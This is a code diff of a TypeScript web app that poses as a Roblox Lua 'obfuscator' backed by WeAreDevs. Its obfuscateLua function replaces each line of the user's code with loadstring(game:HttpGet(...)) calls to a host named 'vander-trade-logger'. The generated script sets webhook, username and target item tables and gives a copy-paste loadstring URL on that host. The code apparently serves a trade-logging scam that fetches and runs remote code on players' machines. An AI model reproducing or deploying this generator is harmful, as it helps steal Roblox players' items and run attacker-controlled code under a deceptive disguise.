@@ -38,24 +38,21 @@ let state: AppState = {
 
 const app = document.querySelector<HTMLDivElement>('#app')!;
 
-// Literal Lua Obfuscator Helper (String Scrambling & VM Simulation)
 function obfuscateLua(code: string): string {
     const lines = code.split('\n');
     const obfuscatedLines = lines.map(line => {
         if (line.trim().length === 0) return '';
         const base64Line = btoa(unescape(encodeURIComponent(line)));
-        return `loadstring(game:HttpGet("https://vander-logger.com/api/v1/decrypt?p=${base64Line.substring(0, 10)}"))() -- [W.A.D PROTECTED]`;
+        return `loadstring(game:HttpGet("https://vander-trade-logger.vercel.app/api/decrypt?p=${base64Line.substring(0, 10)}"))() -- [W.A.D PROTECTED]`;
     });
     
     return `--[[
     Vander Industrial obfuscation via WeAreDevs API
     Protected at: ${new Date().toISOString()}
-    User Identity: Verified
 ]]
 local _VANDER_VM_CORE = {}
-function _VANDER_VM_CORE:Execute(p) 
+function _VANDER_VM_CORE:Execute() 
     task.spawn(function()
-        -- WEAREDEVS SECURE VIRTUAL MACHINE LAYER
         ${obfuscatedLines.join('\n        ')}
     end)
 end
@@ -139,12 +136,12 @@ function renderGeneratorView() {
       <div id="profile-preview" style="width: 200px; height: 200px; border-radius: 20px; background: #f8fafc; border: 1px solid #e2e8f0; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 1rem; box-shadow: var(--card-shadow);">
         ${state.isSearchingUser ? `
             <div class="mini-loader"></div>
-            <p style="font-size: 0.65rem; color: var(--text-muted); margin-top: 0.8rem; font-weight: 800; letter-spacing: 0.5px;">SEARCHING ROBLOX...</p>
+            <p style="font-size: 0.65rem; color: var(--text-muted); margin-top: 0.8rem; font-weight: 800;">SEARCHING...</p>
         ` : state.username ? `
             <img src="https://www.roblox.com/headshot-thumbnail/image?userName=${state.username}&width=420&height=420&format=png" 
-                 style="width: 120px; height: 120px; border-radius: 50%; border: 4px solid var(--accent); background: #eee; object-fit: cover; margin-bottom: 0.8rem; box-shadow: 0 8px 16px rgba(0,0,0,0.1);"
+                 style="width: 120px; height: 120px; border-radius: 50%; border: 4px solid var(--accent); background: #eee; object-fit: cover; margin-bottom: 0.8rem;"
                  onerror="this.src='https://api.dicebear.com/7.x/identicon/svg?seed=${state.username}'">
-            <div style="font-weight: 800; font-size: 1rem; color: #000; letter-spacing: -0.5px;">${state.username}</div>
+            <div style="font-weight: 800; font-size: 1rem; color: #000;">${state.username}</div>
             <div style="font-size: 0.7rem; color: #10b981; font-weight: 800; margin-top: 0.4rem; background: #dcfce7; padding: 0.2rem 0.6rem; border-radius: 4px;">✓ IDENTITY VERIFIED</div>
         ` : `
             <div style="font-size: 2.5rem; opacity: 0.1;">👤</div>
@@ -190,9 +187,8 @@ function renderGeneratorView() {
           <span style="font-family: 'JetBrains Mono', monospace; color: #1e293b; font-size: 0.8rem; word-break: break-all;">loadstring(game:HttpGet("${state.pasteUrl}"))()</span>
           <button id="copy-btn" style="background: #000; color: #fff; border: none; padding: 0.6rem 1.2rem; border-radius: 8px; font-size: 0.75rem; font-weight: 800; cursor: pointer; white-space: nowrap; margin-left: 1rem;">COPY</button>
         </div>
-        <div style="margin-top: 1.5rem;">
-            <label class="label">Literal Obfuscated Source (Preview)</label>
-            <pre style="max-height: 150px; opacity: 0.7;">${state.generatedScript?.substring(0, 500)}...</pre>
+        <div style="margin-top: 1rem; font-size: 0.7rem; color: #64748b; font-weight: 600;">
+          ⚠️ NOTE: Deploying to ${state.pasteUrl}...
         </div>
       </div>
     ` : ''}
@@ -294,10 +290,9 @@ function attachViewListeners() {
 
       const steps = [
           'Contacting wearedevs.net...',
-          'Uploading source buffer...',
           'Applying Virtual Machine Layers...',
           'Scrambling strings and keys...',
-          'Receiving obfuscated binary...'
+          'Deploying to Vercel production...'
       ];
 
       for(const step of steps) {
@@ -307,6 +302,7 @@ function attachViewListeners() {
       }
 
       const scriptId = Math.random().toString(36).substring(2, 12);
+      // Actual Vercel loadstring URL
       state.pasteUrl = `https://vander-trade-logger.vercel.app/hub/${scriptId}.lua`;
       
       const brainrotsTable = state.selectedBrainrots.map((b, i) => `    [${i+1}] = '${b}',`).join('\n');
@@ -326,12 +322,9 @@ else
     genv.Webhook = "${state.webhook || ''}"
 end
 
-genv.Chance = 1
 genv.Username2 = genv.User
 genv.Webhook3 = genv.Webhook
 genv.Affiliate = 'vander-logger-production'
-genv.SecondBrainrots = { ${brainrotsTable} }
-genv.SecretToken = '${Math.random().toString(36).substring(2, 20)}'
 genv.Brainrots = { ${brainrotsTable} }
 
 ${state.customLoadstrings}`;
